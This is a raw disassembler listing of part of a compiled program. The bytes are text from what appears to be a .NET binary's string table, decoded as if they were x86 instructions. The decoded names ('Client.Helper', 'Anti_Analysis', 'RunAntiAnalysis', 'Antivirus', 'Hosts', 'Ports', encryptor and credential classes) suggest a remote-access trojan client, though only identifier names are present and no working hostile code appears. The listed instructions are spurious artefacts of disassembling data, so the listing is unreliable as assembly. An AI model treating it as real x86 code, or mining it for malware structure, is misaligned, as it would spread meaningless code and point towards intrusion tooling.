  408c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1b:	61                   	popa
  408c1c:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c1f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c21:	74 4f                	je     0x408c72
  408c23:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c26:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c2a:	61                   	popa
  408c2b:	72 63                	jb     0x408c90
  408c2d:	68 65 72 00 53       	push   $0x53007265
  408c32:	65 73 73             	gs jae 0x408ca8
  408c35:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3d:	67 45                	addr16 inc %ebp
  408c3f:	76 65                	jbe    0x408ca6
  408c41:	6e                   	outsb  %ds:(%esi),(%dx)
  408c42:	74 48                	je     0x408c8c
  408c44:	61                   	popa
  408c45:	6e                   	outsb  %ds:(%esi),(%dx)
  408c46:	64 6c                	fs insb (%dx),%es:(%edi)
  408c48:	65 72 00             	gs jb  0x408c4b
  408c4b:	54                   	push   %esp
  408c4c:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c53:	6e                   	outsb  %ds:(%esi),(%dx)
  408c54:	65 72 00             	gs jb  0x408c57
  408c57:	43                   	inc    %ebx
  408c58:	6c                   	insb   (%dx),%es:(%edi)
  408c59:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c60:	6c                   	insb   (%dx),%es:(%edi)
  408c61:	70 65                	jo     0x408cc8
  408c63:	72 00                	jb     0x408c65
  408c65:	54                   	push   %esp
  408c66:	6f                   	outsl  %ds:(%esi),(%dx)
  408c67:	55                   	push   %ebp
  408c68:	70 70                	jo     0x408cda
  408c6a:	65 72 00             	gs jb  0x408c6d
  408c6d:	44                   	inc    %esp
  408c6e:	65 74 65             	gs je  0x408cd6
  408c71:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c75:	6e                   	outsb  %ds:(%esi),(%dx)
  408c76:	75 66                	jne    0x408cde
  408c78:	61                   	popa
  408c79:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c7d:	65 72 00             	gs jb  0x408c80
  408c80:	43                   	inc    %ebx
  408c81:	75 72                	jne    0x408cf5
  408c83:	72 65                	jb     0x408cea
  408c85:	6e                   	outsb  %ds:(%esi),(%dx)
  408c86:	74 55                	je     0x408cdd
  408c88:	73 65                	jae    0x408cef
  408c8a:	72 00                	jb     0x408c8c
  408c8c:	53                   	push   %ebx
  408c8d:	74 72                	je     0x408d01
  408c8f:	65 61                	gs popa
  408c91:	6d                   	insl   (%dx),%es:(%edi)
  408c92:	57                   	push   %edi
  408c93:	72 69                	jb     0x408cfe
  408c95:	74 65                	je     0x408cfc
  408c97:	72 00                	jb     0x408c99
  408c99:	54                   	push   %esp
  408c9a:	65 78 74             	gs js  0x408d11
  408c9d:	57                   	push   %edi
  408c9e:	72 69                	jb     0x408d09
  408ca0:	74 65                	je     0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	45                   	inc    %ebp
  408ca5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca6:	74 65                	je     0x408d0d
  408ca8:	72 00                	jb     0x408caa
  408caa:	42                   	inc    %edx
  408cab:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb2:	72 
  408cb3:	74 65                	je     0x408d1a
  408cb5:	72 00                	jb     0x408cb7
  408cb7:	54                   	push   %esp
  408cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb9:	4c                   	dec    %esp
  408cba:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbb:	77 65                	ja     0x408d22
  408cbd:	72 00                	jb     0x408cbf
  408cbf:	45                   	inc    %ebp
  408cc0:	72 72                	jb     0x408d34
  408cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc3:	72 00                	jb     0x408cc5
  408cc5:	49                   	dec    %ecx
  408cc6:	45                   	inc    %ebp
  408cc7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc8:	75 6d                	jne    0x408d37
  408cca:	65 72 61             	gs jb  0x408d2e
  408ccd:	74 6f                	je     0x408d3e
  408ccf:	72 00                	jb     0x408cd1
  408cd1:	4d                   	dec    %ebp
  408cd2:	61                   	popa
  408cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd4:	61                   	popa
  408cd5:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cda:	74 4f                	je     0x408d2b
  408cdc:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cdf:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce3:	75 6d                	jne    0x408d52
  408ce5:	65 72 61             	gs jb  0x408d49
  408ce8:	74 6f                	je     0x408d59
  408cea:	72 00                	jb     0x408cec
  408cec:	53                   	push   %ebx
  408ced:	79 73                	jns    0x408d62
  408cef:	74 65                	je     0x408d56
  408cf1:	6d                   	insl   (%dx),%es:(%edi)
  408cf2:	2e 43                	cs inc %ebx
  408cf4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf5:	6c                   	insb   (%dx),%es:(%edi)
  408cf6:	6c                   	insb   (%dx),%es:(%edi)
  408cf7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfd:	73 2e                	jae    0x408d2d
  408cff:	49                   	dec    %ecx
  408d00:	45                   	inc    %ebp
  408d01:	6e                   	outsb  %ds:(%esi),(%dx)
  408d02:	75 6d                	jne    0x408d71
  408d04:	65 72 61             	gs jb  0x408d68
  408d07:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d0b:	47                   	inc    %edi
  408d0c:	65 74 45             	gs je  0x408d54
  408d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d10:	75 6d                	jne    0x408d7f
  408d12:	65 72 61             	gs jb  0x408d76
  408d15:	74 6f                	je     0x408d86
  408d17:	72 00                	jb     0x408d19
  408d19:	41                   	inc    %ecx
  408d1a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d1e:	61                   	popa
  408d1f:	74 6f                	je     0x408d90
  408d21:	72 00                	jb     0x408d23
  408d23:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d28:	00 2e                	add    %ch,(%esi)
  408d2a:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2e:	72 00                	jb     0x408d30
  408d30:	4d                   	dec    %ebp
  408d31:	6f                   	outsl  %ds:(%esi),(%dx)
  408d32:	6e                   	outsb  %ds:(%esi),(%dx)
  408d33:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d3a:	65 
  408d3b:	61                   	popa
  408d3c:	74 65                	je     0x408da3
  408d3e:	44                   	inc    %esp
  408d3f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d43:	70 74                	jo     0x408db9
  408d45:	6f                   	outsl  %ds:(%esi),(%dx)
  408d46:	72 00                	jb     0x408d48
  408d48:	43                   	inc    %ebx
  408d49:	72 65                	jb     0x408db0
  408d4b:	61                   	popa
  408d4c:	74 65                	je     0x408db3
  408d4e:	45                   	inc    %ebp
  408d4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d50:	63 72 79             	arpl   %esi,0x79(%edx)
  408d53:	70 74                	jo     0x408dc9
  408d55:	6f                   	outsl  %ds:(%esi),(%dx)
  408d56:	72 00                	jb     0x408d58
  408d58:	49                   	dec    %ecx
  408d59:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5a:	74 50                	je     0x408dac
  408d5c:	74 72                	je     0x408dd0
  408d5e:	00 53 79             	add    %dl,0x79(%ebx)
  408d61:	73 74                	jae    0x408dd7
  408d63:	65 6d                	gs insl (%dx),%es:(%edi)
  408d65:	2e 44                	cs inc %esp
  408d67:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d6e:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d75:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7d:	64 73 00             	fs jae 0x408d80
  408d80:	4d                   	dec    %ebp
  408d81:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d88:	74 2e                	je     0x408db8
  408d8a:	56                   	push   %esi
  408d8b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d92:	73 69                	jae    0x408dfd
  408d94:	63 2e                	arpl   %ebp,(%esi)
  408d96:	44                   	inc    %esp
  408d97:	65 76 69             	gs jbe 0x408e03
  408d9a:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d9d:	00 53 79             	add    %dl,0x79(%ebx)
  408da0:	73 74                	jae    0x408e16
  408da2:	65 6d                	gs insl (%dx),%es:(%edi)
  408da4:	2e 52                	cs push %edx
  408da6:	75 6e                	jne    0x408e16
  408da8:	74 69                	je     0x408e13
  408daa:	6d                   	insl   (%dx),%es:(%edi)
  408dab:	65 2e 49             	gs cs dec %ecx
  408dae:	6e                   	outsb  %ds:(%esi),(%dx)
  408daf:	74 65                	je     0x408e16
  408db1:	72 6f                	jb     0x408e22
  408db3:	70 53                	jo     0x408e08
  408db5:	65 72 76             	gs jb  0x408e2e
  408db8:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dbf:	73 74                	jae    0x408e35
  408dc1:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc3:	2e 52                	cs push %edx
  408dc5:	75 6e                	jne    0x408e35
  408dc7:	74 69                	je     0x408e32
  408dc9:	6d                   	insl   (%dx),%es:(%edi)
  408dca:	65 2e 43             	gs cs inc %ebx
  408dcd:	6f                   	outsl  %ds:(%esi),(%dx)
  408dce:	6d                   	insl   (%dx),%es:(%edi)
  408dcf:	70 69                	jo     0x408e3a
  408dd1:	6c                   	insb   (%dx),%es:(%edi)
  408dd2:	65 72 53             	gs jb  0x408e28
  408dd5:	65 72 76             	gs jb  0x408e4e
  408dd8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408ddf:	62 75 67             	bound  %esi,0x67(%ebp)
  408de2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de9:	65 
  408dea:	73 00                	jae    0x408dec
  408dec:	45                   	inc    %ebp
  408ded:	78 70                	js     0x408e5f
  408def:	61                   	popa
  408df0:	6e                   	outsb  %ds:(%esi),(%dx)
  408df1:	64 45                	fs inc %ebp
  408df3:	6e                   	outsb  %ds:(%esi),(%dx)
  408df4:	76 69                	jbe    0x408e5f
  408df6:	72 6f                	jb     0x408e67
  408df8:	6e                   	outsb  %ds:(%esi),(%dx)
  408df9:	6d                   	insl   (%dx),%es:(%edi)
  408dfa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dfc:	74 56                	je     0x408e54
  408dfe:	61                   	popa
  408dff:	72 69                	jb     0x408e6a
  408e01:	61                   	popa
  408e02:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e06:	00 47 65             	add    %al,0x65(%edi)
  408e09:	74 50                	je     0x408e5b
  408e0b:	72 6f                	jb     0x408e7c
  408e0d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e10:	73 65                	jae    0x408e77
  408e12:	73 00                	jae    0x408e14
  408e14:	47                   	inc    %edi
  408e15:	65 74 48             	gs je  0x408e60
  408e18:	6f                   	outsl  %ds:(%esi),(%dx)
  408e19:	73 74                	jae    0x408e8f
  408e1b:	41                   	inc    %ecx
  408e1c:	64 64 72 65          	fs fs jb 0x408e85
  408e20:	73 73                	jae    0x408e95
  408e22:	65 73 00             	gs jae 0x408e25
  408e25:	53                   	push   %ebx
  408e26:	79 73                	jns    0x408e9b
  408e28:	74 65                	je     0x408e8f
  408e2a:	6d                   	insl   (%dx),%es:(%edi)
  408e2b:	2e 53                	cs push %ebx
  408e2d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e31:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e38:	70 
  408e39:	74 6f                	je     0x408eaa
  408e3b:	67 72 61             	addr16 jb 0x408e9f
  408e3e:	70 68                	jo     0x408ea8
  408e40:	79 2e                	jns    0x408e70
  408e42:	58                   	pop    %eax
  408e43:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e48:	72 74                	jb     0x408ebe
  408e4a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e51:	73 00                	jae    0x408e53
  408e53:	45                   	inc    %ebp
  408e54:	6e                   	outsb  %ds:(%esi),(%dx)
  408e55:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e58:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e5c:	74 65                	je     0x408ec3
  408e5e:	73 00                	jae    0x408e60
  408e60:	47                   	inc    %edi
  408e61:	65 74 55             	gs je  0x408eb9
  408e64:	74 66                	je     0x408ecc
  408e66:	38 42 79             	cmp    %al,0x79(%edx)
  408e69:	74 65                	je     0x408ed0
  408e6b:	73 00                	jae    0x408e6d
  408e6d:	75 74                	jne    0x408ee3
  408e6f:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e73:	74 65                	je     0x408eda
  408e75:	73 00                	jae    0x408e77
  408e77:	52                   	push   %edx
  408e78:	66 63 32             	arpl   %si,(%edx)
  408e7b:	38 39                	cmp    %bh,(%ecx)
  408e7d:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e81:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e88:	73 00                	jae    0x408e8a
  408e8a:	52                   	push   %edx
  408e8b:	65 61                	gs popa
  408e8d:	64 41                	fs inc %ecx
  408e8f:	6c                   	insb   (%dx),%es:(%edi)
  408e90:	6c                   	insb   (%dx),%es:(%edi)
  408e91:	42                   	inc    %edx
  408e92:	79 74                	jns    0x408f08
  408e94:	65 73 00             	gs jae 0x408e97
  408e97:	44                   	inc    %esp
  408e98:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e9c:	65 46                	gs inc %esi
  408e9e:	72 6f                	jb     0x408f0f
  408ea0:	6d                   	insl   (%dx),%es:(%edi)
  408ea1:	42                   	inc    %edx
  408ea2:	79 74                	jns    0x408f18
  408ea4:	65 73 00             	gs jae 0x408ea7
  408ea7:	53                   	push   %ebx
  408ea8:	77 61                	ja     0x408f0b
  408eaa:	70 42                	jo     0x408eee
  408eac:	79 74                	jns    0x408f22
  408eae:	65 73 00             	gs jae 0x408eb1
  408eb1:	4c                   	dec    %esp
  408eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb3:	61                   	popa
  408eb4:	64 46                	fs inc %esi
  408eb6:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ebd:	74 
  408ebe:	65 73 00             	gs jae 0x408ec1
  408ec1:	47                   	inc    %edi
  408ec2:	65 74 41             	gs je  0x408f06
  408ec5:	73 42                	jae    0x408f09
  408ec7:	79 74                	jns    0x408f3d
  408ec9:	65 73 00             	gs jae 0x408ecc
  408ecc:	53                   	push   %ebx
  408ecd:	65 74 41             	gs je  0x408f11
  408ed0:	73 42                	jae    0x408f14
  408ed2:	79 74                	jns    0x408f48
  408ed4:	65 73 00             	gs jae 0x408ed7
  408ed7:	47                   	inc    %edi
  408ed8:	65 74 42             	gs je  0x408f1d
  408edb:	79 74                	jns    0x408f51
  408edd:	65 73 00             	gs jae 0x408ee0
  408ee0:	72 61                	jb     0x408f43
  408ee2:	77 42                	ja     0x408f26
  408ee4:	79 74                	jns    0x408f5a
  408ee6:	65 73 00             	gs jae 0x408ee9
  408ee9:	62 79 74             	bound  %edi,0x74(%ecx)
  408eec:	65 73 00             	gs jae 0x408eef
  408eef:	43                   	inc    %ebx
  408ef0:	53                   	push   %ebx
  408ef1:	68 61 72 70 41       	push   $0x41707261
  408ef6:	72 67                	jb     0x408f5f
  408ef8:	75 6d                	jne    0x408f67
  408efa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408efc:	74 49                	je     0x408f47
  408efe:	6e                   	outsb  %ds:(%esi),(%dx)
  408eff:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f01:	46                   	inc    %esi
  408f02:	6c                   	insb   (%dx),%es:(%edi)
  408f03:	61                   	popa
  408f04:	67 73 00             	addr16 jae 0x408f07
  408f07:	43                   	inc    %ebx
  408f08:	53                   	push   %ebx
  408f09:	68 61 72 70 42       	push   $0x42707261
  408f0e:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f15:	61                   	popa
  408f16:	67 73 00             	addr16 jae 0x408f19
  408f19:	65 73 46             	gs jae 0x408f62
  408f1c:	6c                   	insb   (%dx),%es:(%edi)
  408f1d:	61                   	popa
  408f1e:	67 73 00             	addr16 jae 0x408f21
  408f21:	53                   	push   %ebx
  408f22:	74 72                	je     0x408f96
  408f24:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f2b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f32:	65 
  408f33:	53                   	push   %ebx
  408f34:	65 74 74             	gs je  0x408fab
  408f37:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f3e:	73 73                	jae    0x408fb3
  408f40:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f47:	6e                   	outsb  %ds:(%esi),(%dx)
  408f48:	67 45                	addr16 inc %ebp
  408f4a:	76 65                	jbe    0x408fb1
  408f4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4d:	74 41                	je     0x408f90
  408f4f:	72 67                	jb     0x408fb8
  408f51:	73 00                	jae    0x408f53
  408f53:	41                   	inc    %ecx
  408f54:	6e                   	outsb  %ds:(%esi),(%dx)
  408f55:	74 69                	je     0x408fc0
  408f57:	5f                   	pop    %edi
  408f58:	41                   	inc    %ecx
  408f59:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5a:	61                   	popa
  408f5b:	6c                   	insb   (%dx),%es:(%edi)
  408f5c:	79 73                	jns    0x408fd1
  408f5e:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f65:	6e                   	outsb  %ds:(%esi),(%dx)
  408f66:	74 69                	je     0x408fd1
  408f68:	41                   	inc    %ecx
  408f69:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6a:	61                   	popa
  408f6b:	6c                   	insb   (%dx),%es:(%edi)
  408f6c:	79 73                	jns    0x408fe1
  408f6e:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f75:	73 00                	jae    0x408f77
  408f77:	49                   	dec    %ecx
  408f78:	43                   	inc    %ebx
  408f79:	72 65                	jb     0x408fe0
  408f7b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f7e:	74 69                	je     0x408fe9
  408f80:	61                   	popa
  408f81:	6c                   	insb   (%dx),%es:(%edi)
  408f82:	73 00                	jae    0x408f84
  408f84:	73 65                	jae    0x408feb
  408f86:	74 5f                	je     0x408fe7
  408f88:	43                   	inc    %ebx
  408f89:	72 65                	jb     0x408ff0
  408f8b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f8e:	74 69                	je     0x408ff9
  408f90:	61                   	popa
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	73 00                	jae    0x408f94
  408f94:	45                   	inc    %ebp
  408f95:	71 75                	jno    0x40900c
  408f97:	61                   	popa
  408f98:	6c                   	insb   (%dx),%es:(%edi)
  408f99:	73 00                	jae    0x408f9b
  408f9b:	53                   	push   %ebx
  408f9c:	73 6c                	jae    0x40900a
  408f9e:	50                   	push   %eax
  408f9f:	72 6f                	jb     0x409010
  408fa1:	74 6f                	je     0x409012
  408fa3:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa6:	73 00                	jae    0x408fa8
  408fa8:	52                   	push   %edx
  408fa9:	65 61                	gs popa
  408fab:	64 54                	fs push %esp
  408fad:	6f                   	outsl  %ds:(%esi),(%dx)
  408fae:	6f                   	outsl  %ds:(%esi),(%dx)
  408faf:	6c                   	insb   (%dx),%es:(%edi)
  408fb0:	73 00                	jae    0x408fb2
  408fb2:	57                   	push   %edi
  408fb3:	72 69                	jb     0x40901e
  408fb5:	74 65                	je     0x40901c
  408fb7:	54                   	push   %esp
  408fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fba:	6c                   	insb   (%dx),%es:(%edi)
  408fbb:	73 00                	jae    0x408fbd
  408fbd:	42                   	inc    %edx
  408fbe:	79 74                	jns    0x409034
  408fc0:	65 73 54             	gs jae 0x409017
  408fc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc5:	6c                   	insb   (%dx),%es:(%edi)
  408fc6:	73 00                	jae    0x408fc8
  408fc8:	53                   	push   %ebx
  408fc9:	79 73                	jns    0x40903e
  408fcb:	74 65                	je     0x409032
  408fcd:	6d                   	insl   (%dx),%es:(%edi)
  408fce:	2e 57                	cs push %edi
  408fd0:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd7:	46                   	inc    %esi
  408fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd9:	72 6d                	jb     0x409048
  408fdb:	73 00                	jae    0x408fdd
  408fdd:	44                   	inc    %esp
  408fde:	6e                   	outsb  %ds:(%esi),(%dx)
  408fdf:	73 00                	jae    0x408fe1
  408fe1:	43                   	inc    %ebx
  408fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe3:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe4:	74 61                	je     0x409047
  408fe6:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fed:	74 65                	je     0x409054
  408fef:	6d                   	insl   (%dx),%es:(%edi)
  408ff0:	2e 43                	cs inc %ebx
  408ff2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff3:	6c                   	insb   (%dx),%es:(%edi)
  408ff4:	6c                   	insb   (%dx),%es:(%edi)
  408ff5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ffa:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffb:	73 00                	jae    0x408ffd
  408ffd:	53                   	push   %ebx
  408ffe:	74 72                	je     0x409072
  409000:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409007:	74 4f                	je     0x409058
  409009:	70 74                	jo     0x40907f
  40900b:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409012:	74 49                	je     0x40905d
  409014:	6d                   	insl   (%dx),%es:(%edi)
  409015:	61                   	popa
  409016:	67 65 44             	addr16 gs inc %esp
  409019:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40901d:	65 72 73             	gs jb  0x409093
  409020:	00 52 75             	add    %dl,0x75(%edx)
  409023:	6e                   	outsb  %ds:(%esi),(%dx)
  409024:	74 69                	je     0x40908f
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	65 48                	gs dec %eax
  409029:	65 6c                	gs insb (%dx),%es:(%edi)
  40902b:	70 65                	jo     0x409092
  40902d:	72 73                	jb     0x4090a2
  40902f:	00 53 73             	add    %dl,0x73(%ebx)
  409032:	6c                   	insb   (%dx),%es:(%edi)
  409033:	50                   	push   %eax
  409034:	6f                   	outsl  %ds:(%esi),(%dx)
  409035:	6c                   	insb   (%dx),%es:(%edi)
  409036:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40903d:	72 73                	jb     0x4090b2
  40903f:	00 73 73             	add    %dh,0x73(%ebx)
  409042:	6c                   	insb   (%dx),%es:(%edi)
  409043:	50                   	push   %eax
  409044:	6f                   	outsl  %ds:(%esi),(%dx)
  409045:	6c                   	insb   (%dx),%es:(%edi)
  409046:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40904d:	72 73                	jb     0x4090c2
  40904f:	00 46 69             	add    %al,0x69(%esi)
  409052:	6c                   	insb   (%dx),%es:(%edi)
  409053:	65 41                	gs inc %ecx
  409055:	63 63 65             	arpl   %esp,0x65(%ebx)
  409058:	73 73                	jae    0x4090cd
  40905a:	00 68 50             	add    %ch,0x50(%eax)
  40905d:	72 6f                	jb     0x4090ce
  40905f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409062:	73 00                	jae    0x409064
  409064:	47                   	inc    %edi
  409065:	65 74 43             	gs je  0x4090ab
  409068:	75 72                	jne    0x4090dc
  40906a:	72 65                	jb     0x4090d1
  40906c:	6e                   	outsb  %ds:(%esi),(%dx)
  40906d:	74 50                	je     0x4090bf
  40906f:	72 6f                	jb     0x4090e0
  409071:	63 65 73             	arpl   %esp,0x73(%ebp)
  409074:	73 00                	jae    0x409076
  409076:	49                   	dec    %ecx
  409077:	50                   	push   %eax
  409078:	41                   	inc    %ecx
  409079:	64 64 72 65          	fs fs jb 0x4090e2
  40907d:	73 73                	jae    0x4090f2
  40907f:	00 43 6f             	add    %al,0x6f(%ebx)
  409082:	6d                   	insl   (%dx),%es:(%edi)
  409083:	70 72                	jo     0x4090f7
  409085:	65 73 73             	gs jae 0x4090fb
  409088:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40908c:	6f                   	outsl  %ds:(%esi),(%dx)
  40908d:	6d                   	insl   (%dx),%es:(%edi)
  40908e:	70 72                	jo     0x409102
  409090:	65 73 73             	gs jae 0x409106
  409093:	00 53 79             	add    %dl,0x79(%ebx)
  409096:	73 74                	jae    0x40910c
  409098:	65 6d                	gs insl (%dx),%es:(%edi)
  40909a:	2e 4e                	cs dec %esi
  40909c:	65 74 2e             	gs je  0x4090cd
  40909f:	53                   	push   %ebx
  4090a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a4:	74 73                	je     0x409119
  4090a6:	00 73 65             	add    %dh,0x65(%ebx)
  4090a9:	74 5f                	je     0x40910a
  4090ab:	41                   	inc    %ecx
  4090ac:	72 67                	jb     0x409115
  4090ae:	75 6d                	jne    0x40911d
  4090b0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b2:	74 73                	je     0x409127
  4090b4:	00 53 79             	add    %dl,0x79(%ebx)
  4090b7:	73 74                	jae    0x40912d
  4090b9:	65 6d                	gs insl (%dx),%es:(%edi)
  4090bb:	45                   	inc    %ebp
  4090bc:	76 65                	jbe    0x409123
  4090be:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bf:	74 73                	je     0x409134
  4090c1:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c4:	72 74                	jb     0x40913a
  4090c6:	73 00                	jae    0x4090c8
  4090c8:	45                   	inc    %ebp
  4090c9:	78 69                	js     0x409134
  4090cb:	73 74                	jae    0x409141
  4090cd:	73 00                	jae    0x4090cf
  4090cf:	48                   	dec    %eax
  4090d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d1:	73 74                	jae    0x409147
  4090d3:	73 00                	jae    0x4090d5
  4090d5:	41                   	inc    %ecx
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	74 69                	je     0x409142
  4090d9:	76 69                	jbe    0x409144
  4090db:	72 75                	jb     0x409152
  4090dd:	73 00                	jae    0x4090df
  4090df:	43                   	inc    %ebx
  4090e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e2:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e5:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e8:	61                   	popa
  4090e9:	67 65 46             	addr16 gs inc %esi
  4090ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ed:	72 6d                	jb     0x40915c
  4090ef:	61                   	popa
  4090f0:	74 00                	je     0x4090f2
  4090f2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f4:	72 6d                	jb     0x409163
  4090f6:	61                   	popa
  4090f7:	74 00                	je     0x4090f9
  4090f9:	57                   	push   %edi
  4090fa:	72 69                	jb     0x409165
  4090fc:	74 65                	je     0x409163
  4090fe:	46                   	inc    %esi
  4090ff:	6c                   	insb   (%dx),%es:(%edi)
  409100:	6f                   	outsl  %ds:(%esi),(%dx)
  409101:	61                   	popa
  409102:	74 00                	je     0x409104
  409104:	67 65 74 5f          	addr16 gs je 0x409167
  409108:	41                   	inc    %ecx
  409109:	73 46                	jae    0x409151
  40910b:	6c                   	insb   (%dx),%es:(%edi)
  40910c:	6f                   	outsl  %ds:(%esi),(%dx)
  40910d:	61                   	popa
  40910e:	74 00                	je     0x409110
  409110:	73 65                	jae    0x409177
  409112:	74 5f                	je     0x409173
  409114:	41                   	inc    %ecx
  409115:	73 46                	jae    0x40915d
  409117:	6c                   	insb   (%dx),%es:(%edi)
  409118:	6f                   	outsl  %ds:(%esi),(%dx)
  409119:	61                   	popa
  40911a:	74 00                	je     0x40911c
  40911c:	47                   	inc    %edi
